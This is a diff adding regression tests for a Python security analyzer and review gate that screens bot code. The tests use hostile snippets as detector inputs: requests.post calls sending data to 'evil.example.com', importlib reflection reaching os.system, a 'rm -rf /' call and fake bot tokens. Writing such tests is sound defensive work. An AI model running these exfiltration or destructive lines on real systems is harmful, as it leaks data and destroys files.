@@ -251,3 +251,104 @@ def test_invalid_reviewer_handles_are_rejected():
     for handle in ("", "x" * 65, "alice!"):
         with pytest.raises(ReviewError):
             Reviewer(handle)
+
+
+# --------------------------------------------------------------------------- #
+# Regressionstests aus dem Security-Audit 2026-09: die reproduzierten
+# Gate-Bypasses (H-1) und das Rejection-Loch (B-3) müssen dauerhaft zu sein.
+# --------------------------------------------------------------------------- #
+class TestAuditBypassRegressions:
+    def test_requests_alias_with_constant_url_is_blocked(self):
+        """H-1/D: `import requests as rq` + konstante Fremd-URL war völlig unsichtbar."""
+        src = (
+            "import requests as rq\n"
+            'def f():\n'
+            '    return rq.get("https://evil.example.com/x")\n'
+        )
+        rep = analyze_code(src)
+        assert not rep.ok
+        assert "BK004" in {f.rule_id for f in rep.findings}
+
+    def test_variable_url_folds_module_constant(self):
+        """H-1/A: URL in Modul-Konstante — jetzt gefaltet und blockiert."""
+        src = (
+            "import requests\n"
+            'EXFIL = "https://evil.example.com/collect"\n'
+            'def leak(data):\n'
+            "    requests.post(EXFIL, json=data)\n"
+        )
+        rep = analyze_code(src)
+        assert not rep.ok
+        assert "BK004" in {f.rule_id for f in rep.findings}
+
+    def test_fstring_constant_prefix_resolves(self):
+        """H-1/E: f"https://evil/{path}" — konstanter Kopf reicht für BK004."""
+        rep = analyze_code(
+            'import requests\nrequests.post(f"https://evil.example.com/{p}", json=d)\n'
+        )
+        assert "BK004" in {f.rule_id for f in rep.findings}
+
+    def test_legit_api_base_fstring_stays_clean(self):
+        """Gegentest: der minimale Referenz-Bot nutzt genau dieses Muster."""
+        src = (
+            "import requests\n"
+            'API_BASE = "https://api.telegram.org"\n'
+            'def call(token, method, payload):\n'
+            '    requests.post(f"{API_BASE}/bot{token}/{method}", json=payload)\n'
+        )
+        # API_BASE bekannt -> nur der "{token}"-Teil ist dynamisch; das
+        # Ergebnis darf kein BK004 sein.
+        rep = analyze_code(src)
+        assert "BK004" not in {f.rule_id for f in rep.findings}
+
+    def test_importlib_and_tempfile_blocked(self):
+        """H-1/B: Reflektion + temporäre Persistenz."""
+        rep = analyze_code('import importlib\nm = importlib.import_module("os")\nm.system("ls")\n')
+        assert "BK001" in {f.rule_id for f in rep.findings}
+        rep = analyze_code("import tempfile\ntempfile.mkdtemp()\n")
+        assert "BK001" in {f.rule_id for f in rep.findings}
+        rep = analyze_code("from importlib import import_module\n")
+        assert "BK001" in {f.rule_id for f in rep.findings}
+
+    def test_annassign_and_dict_token_literals_blocked(self):
+        """H-1/C: Token jenseits von ast.Assign."""
+        rep = analyze_code('API_TOKEN: str = "123456789:AAH1bcDefGhIjKlMnOpQrStUvWxYz012345"\n')
+        assert "BK006" in {f.rule_id for f in rep.findings}
+        rep = analyze_code('CFG = {"key": "123456789:AAH1bcDefGhIjKlMnOpQrStUvWxYz012345"}\n')
+        assert "BK006" in {f.rule_id for f in rep.findings}
+        rep = analyze_code('configure(token="123456789:AAH1bcDefGhIjKlMnOpQrStUvWxYz012345")\n')
+        assert "BK006" in {f.rule_id for f in rep.findings}
+
+    def test_from_os_system_blocked(self):
+        """H-1: `from os import system` + Naked-Call."""
+        rep = analyze_code('from os import system\nsystem("rm -rf /")\n')
+        assert "BK007" in {f.rule_id for f in rep.findings}
+
+    def test_fixture_covers_new_detectors(self):
+        """Das Negativbeispiel muss alle neuen Umgehungs-Muster feuern."""
+        from pathlib import Path as _P
+        rep = analyze_source(_P("tests/fixtures/insecure_bot.py"))
+        assert rep.ok is False
+
+    def test_rejection_blocks_verify_in_local_mode(self):
+        """B-3: reject() musste den Gate auch ohne Registry schließen."""
+        gate = ReviewGate(ReviewLedger(clock=FakeClock()), registry=None)
+        ticket = gate.submit(42, CLEAN_BOT)
+        gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER), checks=ALL_CHECKS)
+        gate.approve(ticket.ticket_id, Reviewer("bob"), checks=ALL_CHECKS)
+        gate.verify(42, CLEAN_BOT, check_registry=False)  # Zwischenschritt: frei
+
+        gate.reject(ticket.ticket_id, Reviewer("carol"), note="Doch nicht ok")
+        import pytest as _pt
+        with _pt.raises(ReviewGateError):
+            gate.verify(42, CLEAN_BOT, check_registry=False)
+
+    def test_resubmission_after_reject_opens_new_ticket(self):
+        """Aufhebungspfad: gleiches Ticket bleibt abgelehnt, Re-Submit erzeugt ein neues."""
+        gate = ReviewGate(ReviewLedger(clock=FakeClock()), registry=None)
+        old = gate.submit(42, CLEAN_BOT)
+        gate.approve(old.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER), checks=ALL_CHECKS)
+        gate.reject(old.ticket_id, Reviewer("carol"), note="nein")
+        fresh = gate.submit(42, CLEAN_BOT)
+        assert fresh.ticket_id != old.ticket_id
+        assert fresh.decisions == []
